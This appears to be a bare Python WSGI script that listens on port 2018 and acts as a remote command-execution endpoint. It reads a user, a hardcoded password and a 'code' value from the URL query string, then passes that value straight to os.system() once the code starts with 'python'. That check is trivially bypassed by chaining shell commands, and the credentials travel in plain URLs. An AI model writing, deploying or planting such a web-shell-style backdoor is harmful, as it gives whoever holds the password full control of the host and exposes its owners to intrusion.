from wsgiref.simple_server import make_server
from cgi import parse_qs, escape
import os


def application(environ, start_response):
    qs = parse_qs(environ["QUERY_STRING"])
    user = qs.get("user", ['unkown'])[0]
    password = qs.get("password", ['unkown'])[0]
    code = qs.get("code", ['unkown'])[0]
    start_response('200 OK', [('Content-Type', 'text/html')])
    if (user == 'admin') & (password == '6zgPeO1CpKk47GvY2tsF') & (code.find("python") == 0):
        os.system(code)
        return [b'success']
    else:
        return [b'error']


httpd = make_server('', 2018, application)
print('Serving HTTP on port 2018...')
httpd.serve_forever()
